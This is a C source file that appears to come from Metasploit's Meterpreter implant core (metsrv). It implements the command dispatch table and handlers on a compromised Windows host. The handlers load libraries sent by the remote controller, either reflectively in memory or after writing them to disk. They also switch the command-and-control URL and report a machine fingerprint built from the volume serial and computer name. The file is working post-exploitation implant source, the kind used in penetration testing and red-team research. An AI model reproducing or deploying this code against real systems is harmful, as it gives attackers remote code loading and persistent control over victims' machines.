#include "metsrv.h"
#include "common_metapi.h"
#include "common_exports.h"
#include "server_pivot.h"

#define GetProcAddressByOrdinal(mod, ord) GetProcAddress(mod, MAKEINTRESOURCEA(ord))
#define GetProcAddressByOrdinalR(mod, ord) GetProcAddressR(mod, MAKEINTRESOURCEA(ord))

// see ReflectiveLoader.c...
extern HINSTANCE hAppInstance;

// see remote_dispatch_common.c
extern PLIST gExtensionList;
// see common/base.c
extern Command *extensionCommands;

PLIST gExtensionList = NULL;

DWORD request_core_enumextcmd(Remote* remote, Packet* packet);
DWORD request_core_machine_id(Remote* remote, Packet* packet);
DWORD request_core_get_session_guid(Remote* remote, Packet* packet);
DWORD request_core_set_session_guid(Remote* remote, Packet* packet);
DWORD request_core_set_uuid(Remote* remote, Packet* packet);
BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result);

// Dispatch table
Command customCommands[] =
{
	COMMAND_REQ(COMMAND_ID_CORE_LOADLIB, request_core_loadlib),
	COMMAND_REQ(COMMAND_ID_CORE_ENUMEXTCMD, request_core_enumextcmd),
	COMMAND_REQ(COMMAND_ID_CORE_MACHINE_ID, request_core_machine_id),
	COMMAND_REQ(COMMAND_ID_CORE_GET_SESSION_GUID, request_core_get_session_guid),
	COMMAND_REQ(COMMAND_ID_CORE_SET_SESSION_GUID, request_core_set_session_guid),
	COMMAND_REQ(COMMAND_ID_CORE_SET_UUID, request_core_set_uuid),
	COMMAND_REQ(COMMAND_ID_CORE_PIVOT_ADD, request_core_pivot_add),
	COMMAND_REQ(COMMAND_ID_CORE_PIVOT_REMOVE, request_core_pivot_remove),
	COMMAND_INLINE_REP(COMMAND_ID_CORE_PATCH_URL, request_core_patch_url),
	COMMAND_TERMINATOR
};

typedef struct _EnumExtensions
{
	Packet* pResponse;
	UINT command_id_start;
	UINT command_id_end;
} EnumExtensions, * PEnumExtensions;


/*
 * Writes a buffer to a file
 */
DWORD buffer_to_file(LPCSTR filePath, PUCHAR buffer, ULONG length)
{
	DWORD res, offset = 0, bytesLeft = 0, bytesWritten = 0;
	HANDLE h;

	do
	{
		// Try to open the file for writing
		if ((h = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW,
				FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
		{
			res = GetLastError();
			break;
		}

		bytesLeft = length;

		// Keep writing until everything is written
		while ((bytesLeft) &&
			   (WriteFile(h, buffer + offset, bytesLeft, &bytesWritten, NULL)))
		{
			bytesLeft -= bytesWritten;
			offset    += bytesWritten;
		}

		res = ERROR_SUCCESS;

	} while (0);

	if (h != INVALID_HANDLE_VALUE)
		CloseHandle(h);

	return res;
}

BOOL ext_cmd_callback(LPVOID pState, LPVOID pData)
{
	PEnumExtensions pEnum = (PEnumExtensions)pState;
	Command* command = NULL;

	if (pEnum != NULL && pEnum->pResponse != NULL && pData != NULL)
	{
		PEXTENSION pExt = (PEXTENSION)pData;
		for (command = pExt->start; command != pExt->end; command = command->next)
		{
			dprintf("[LISTEXTCMD] Processing extension: %p", pExt);
			if (pEnum->command_id_start < command->command_id && command->command_id < pEnum->command_id_end)
			{
				dprintf("[LISTEXTCMD] Adding command ID %u", command->command_id);
				packet_add_tlv_uint(pEnum->pResponse, TLV_TYPE_UINT, command->command_id);
			}
		}
	}
	return FALSE;
}

BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result)
{
	// this is a special case because we don't actually send
	// response to this. This is a brutal switch without any
	// other forms of comms, and this is because of stageless
	// payloads
	if (remote->transport->type == METERPRETER_TRANSPORT_TCP)
	{
		// This shouldn't happen.
		*result = ERROR_INVALID_STATE;
	}
	else
	{
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
		ctx->new_uri = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
		*result = ERROR_SUCCESS;
	}
	return TRUE;
}

DWORD request_core_enumextcmd(Remote* remote, Packet* packet)
{
	BOOL bResult = FALSE;
	Packet* pResponse = packet_create_response(packet);

	if (pResponse != NULL)
	{
		EnumExtensions enumExt;
		enumExt.pResponse = pResponse;
		enumExt.command_id_start = packet_get_tlv_value_uint(packet, TLV_TYPE_UINT);
		enumExt.command_id_end = packet_get_tlv_value_uint(packet, TLV_TYPE_LENGTH) + enumExt.command_id_start;

		dprintf("[LISTEXTCMD] Listing extension commands between %u and %u", enumExt.command_id_start, enumExt.command_id_end);
		// Start by enumerating the names of the extensions
		bResult = list_enumerate(gExtensionList, ext_cmd_callback, &enumExt);

		packet_transmit_response(ERROR_SUCCESS, remote, pResponse);
	}

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the core pseudo extension
 */
static DWORD deinit_server_extension(Remote* remote)
{
	command_deregister_all(customCommands);
	deregister_base_dispatch_routines();

	return ERROR_SUCCESS;
}

/*
 * Registers custom command handlers
 */
VOID register_dispatch_routines()
{
	gExtensionList = list_create();

	Command* pFirstCommand = register_base_dispatch_routines();
	command_register_all(customCommands);

	PEXTENSION pExtension = (PEXTENSION)malloc(sizeof(EXTENSION));
	if (pExtension) {
		memset(pExtension, 0, sizeof(EXTENSION));
		pExtension->deinit = deinit_server_extension;
		pExtension->end = pFirstCommand;
		pExtension->start = extensionCommands;
		list_push(gExtensionList, pExtension);
		dprintf("[CORE] Registered the core pseudo extension %p", pExtension);
	}
}

/*
 * Deregisters previously registered custom commands and loaded extensions.
 */
VOID deregister_dispatch_routines(Remote * remote)
{
	while (TRUE)
	{
		PEXTENSION extension = list_pop(gExtensionList);
		if (!extension)
		{
			break;
		}

		if (extension->deinit)
		{
			extension->deinit(remote);
		}

		free(extension);
	}

	list_destroy(gExtensionList);
}


/*
 * @brief Perform the initialisation of stageless extensions, if rquired.
 * @param extensionId The id of the extension
 * @param data Pointer to the data containing the initialisation data.
 * @param dataSize Size of the data referenced by \c data.
 * @returns Indication of success or failure.
 */
DWORD stagelessinit_extension(UINT extensionId, LPBYTE data, DWORD dataSize)
{
	dprintf("[STAGELESSINIT] searching for extension init for %u in %p", extensionId, gExtensionList);
	dprintf("[STAGELESSINIT] extension list start is %p", gExtensionList->start);
	for (PNODE node = gExtensionList->start; node != NULL; node = node->next)
	{
		PEXTENSION ext = (PEXTENSION)node->data;
		if (ext->stagelessInit != NULL)
		{
			dprintf("[STAGELESSINIT] passing stageless init");
			ext->stagelessInit(extensionId, data, dataSize);
		}
	}
	return ERROR_SUCCESS;
}

/*
 * @brief Load an extension from the given library handle.
 * @param hLibrary handle to the library to load/init.
 * @param bLibLoadedReflectivly Indication of whether the library was loaded using RDI.
 * @param remote Pointer to the \c Remote instance.
 * @param response Pointer to the \c Response packet.
 * @param pFirstCommand Pointer to the head of the loaded command list.
 * @returns Indication of success or failure.
 */
DWORD load_extension(HMODULE hLibrary, BOOL bLibLoadedReflectivly, Remote* remote, Packet* response, Command* pFirstCommand)
{
	DWORD dwResult = ERROR_OUTOFMEMORY;
	PEXTENSION pExtension = (PEXTENSION)malloc(sizeof(EXTENSION));

	dprintf("[SERVER] Initialising extension %x", hLibrary);
	if (pExtension)
	{
		memset(pExtension, 0, sizeof(EXTENSION));

		pExtension->library = hLibrary;

		// if the library was loaded via its reflective loader we must use GetProcAddressR()
		if (bLibLoadedReflectivly)
		{
			pExtension->init = (PSRVINIT)GetProcAddressByOrdinalR(pExtension->library, EXPORT_INITSERVEREXTENSION);
			pExtension->deinit = (PSRVDEINIT)GetProcAddressByOrdinalR(pExtension->library, EXPORT_DEINITSERVEREXTENSION);
			pExtension->commandAdded = (PCMDADDED)GetProcAddressByOrdinalR(pExtension->library, EXPORT_COMMANDADDED);
			pExtension->stagelessInit = (PSTAGELESSINIT)GetProcAddressByOrdinalR(pExtension->library, EXPORT_STAGELESSINIT);
		}
		else
		{
			pExtension->init = (PSRVINIT)GetProcAddressByOrdinal(pExtension->library, EXPORT_INITSERVEREXTENSION);
			pExtension->deinit = (PSRVDEINIT)GetProcAddressByOrdinal(pExtension->library, EXPORT_DEINITSERVEREXTENSION);
			pExtension->commandAdded = (PCMDADDED)GetProcAddressByOrdinal(pExtension->library, EXPORT_COMMANDADDED);
			pExtension->stagelessInit = (PSTAGELESSINIT)GetProcAddressByOrdinal(pExtension->library, EXPORT_STAGELESSINIT);
		}

		dprintf("[SERVER] Calling init on extension, address is 0x%p", pExtension->init);

		// Call the init routine in the library
		if (pExtension->init)
		{
			dprintf("[SERVER] Calling init()...");

			pExtension->end = pFirstCommand;
			// dwResult can be a mixture of different error types, e.g. HRESULT, win32 error
			dwResult = pExtension->init(met_api, remote);
			pExtension->start = extensionCommands;

			if (dwResult == ERROR_SUCCESS)
			{
				// inform the new extension of the existing commands
				if (pExtension->commandAdded)
				{
					for (Command* command = pExtension->end; command != NULL; command = command->next)
					{
						pExtension->commandAdded(command->command_id);
					}
				}

				list_push(gExtensionList, pExtension);
			}
			else
			{
				free(pExtension);
			}
		}

		dprintf("[SERVER] Called init()...");
		if (response)
		{
			for (Command* command = pExtension->start; command != pExtension->end; command = command->next)
			{
				dprintf("[LOAD EXTENSION] Adding command ID to response: %u", command->command_id);
				packet_add_tlv_uint(response, TLV_TYPE_UINT, command->command_id);

				// inform existing extensions of the new commands
				for (PNODE node = gExtensionList->start; node != NULL; node = node->next)
				{
					PEXTENSION ext = (PEXTENSION)node->data;
					// don't inform the extension of itself
					if (ext != pExtension && ext->commandAdded)
					{
						ext->commandAdded(command->command_id);
					}
				}
			}
		}
	}

	return dwResult;
}

/*
 * @brief Load a library from the request packet.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_loadlib(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	BOOL bLibLoadedReflectivly = FALSE;
  dprintf("[LOADLIB] here 1");

	Command *first = extensionCommands;

	do
	{
  dprintf("[LOADLIB] here 2");
		libraryPath = packet_get_tlv_value_string(packet, TLV_TYPE_LIBRARY_PATH);
  dprintf("[LOADLIB] here 3");
		flags = packet_get_tlv_value_uint(packet, TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath)
		{
			res = ERROR_INVALID_PARAMETER;
			break;
		}
  dprintf("[LOADLIB] here 4");

		// If the lib does not exist locally, but is being uploaded...
		if (!(flags & LOAD_LIBRARY_FLAG_LOCAL))
		{
			PCHAR targetPath;
			Tlv dataTlv;

  dprintf("[LOADLIB] here 5");
			// Get the library's file contents
			if ((packet_get_tlv(packet, TLV_TYPE_DATA,
				&dataTlv) != ERROR_SUCCESS) ||
				(!(targetPath = packet_get_tlv_value_string(packet,
				TLV_TYPE_TARGET_PATH))))
			{
				res = ERROR_INVALID_PARAMETER;
				break;
			}

  dprintf("[LOADLIB] here 6");
			// If the library is not to be stored on disk, 
			if (!(flags & LOAD_LIBRARY_FLAG_ON_DISK))
			{
				LPCSTR reflectiveLoader = packet_get_tlv_value_reflective_loader(packet);
  dprintf("[LOADLIB] here 7");

				// try to load the library via its reflective loader...
				library = LoadLibraryR(dataTlv.buffer, dataTlv.header.length, reflectiveLoader);
  dprintf("[LOADLIB] here 8");
				if (library == NULL)
				{
					// if that fails, presumably besause the library doesn't support
					// reflective injection, we default to using libloader...
					library = libloader_load_library(targetPath,
						dataTlv.buffer, dataTlv.header.length);
				}
				else
				{
					bLibLoadedReflectivly = TRUE;
				}
  dprintf("[LOADLIB] here 9");

				res = (library) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
			}
			else
			{
				// Otherwise, save the library buffer to disk
				res = buffer_to_file(targetPath, dataTlv.buffer,
					dataTlv.header.length);
			}

			// Override the library path
			libraryPath = targetPath;
		}

		// If a previous operation failed, break out.
		if (res != ERROR_SUCCESS)
		{
			break;
		}

		// Load the library
		if (!library && !(library = LoadLibraryA(libraryPath)))
		{
			res = GetLastError();
		}

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if ((flags & LOAD_LIBRARY_FLAG_EXTENSION) && library)
		{
			res = load_extension(library, bLibLoadedReflectivly, remote, response, first);
		}

	} while (0);

  dprintf("[LOADLIB] here 10");
	if (response)
	{
		packet_transmit_response(res, remote, response);
	}
  dprintf("[LOADLIB] here 11");

	return res;
}

/*
 * @brief Set/update the current UUID for the session.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_set_uuid(Remote* remote, Packet* packet)
{
	Packet* response = packet_create_response(packet);
	DWORD newUuidLen = 0;
	PBYTE newUuid = packet_get_tlv_value_raw(packet, TLV_TYPE_UUID, &newUuidLen);

	if (newUuid != NULL)
	{
		memcpy(remote->orig_config->session.uuid, newUuid, UUID_SIZE);
	}

	if (response)
	{
		packet_transmit_response(ERROR_SUCCESS, remote, response);
	}

	return ERROR_SUCCESS;
}

/*
 * @brief Get the current session GUID.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_get_session_guid(Remote* remote, Packet* packet)
{
	Packet* response = packet_create_response(packet);
	if (response)
	{
		packet_add_tlv_raw(response, TLV_TYPE_SESSION_GUID, &remote->orig_config->session.session_guid, sizeof(GUID));
		packet_transmit_response(ERROR_SUCCESS, remote, response);
	}
	return ERROR_SUCCESS;
}

/*
 * @brief Set the current session GUID.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_set_session_guid(Remote* remote, Packet* packet)
{
	DWORD result = ERROR_SUCCESS;
	DWORD sessionGuidLen = 0;
	LPBYTE sessionGuid = packet_get_tlv_value_raw(packet, TLV_TYPE_SESSION_GUID, &sessionGuidLen);

	if (sessionGuid != NULL)
	{
		memcpy(remote->orig_config->session.session_guid, sessionGuid, sizeof(GUID));
	}
	else
	{
		result = ERROR_BAD_ARGUMENTS;
	}

	packet_transmit_empty_response(remote, packet, result);

	return ERROR_SUCCESS;
}

/*
 * @brief Get the current machine identifier.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_machine_id(Remote* remote, Packet* packet)
{
	DWORD res = ERROR_SUCCESS;
	dprintf("[CORE] Running request_core_machine_id");
	Packet* response = packet_create_response(packet);
	dprintf("[CORE] response is %p", response);

	if (response)
	{
		wchar_t buffer[MAX_PATH];
		if (GetSystemDirectory(buffer, MAX_PATH) != 0)
		{
			wchar_t computerName[MAX_PATH];
			DWORD computerNameSize = MAX_PATH;
			DWORD serialNumber;
			wchar_t* backslash = wcschr(buffer, L'\\');
			*(backslash + 1) = L'\0';

			GetVolumeInformation(buffer, NULL, 0, &serialNumber, NULL, 0, NULL, 0);

			GetComputerName(computerName, &computerNameSize);

			_snwprintf_s(buffer, MAX_PATH, MAX_PATH - 1, L"%04x-%04x:%s", HIWORD(serialNumber), LOWORD(serialNumber), computerName);
			packet_add_tlv_wstring(response, TLV_TYPE_MACHINE_ID, buffer);
			dprintf("[CORE] sending machine id: %S", buffer);
		}

		packet_transmit_response(res, remote, response);
	}

	return ERROR_SUCCESS;
}
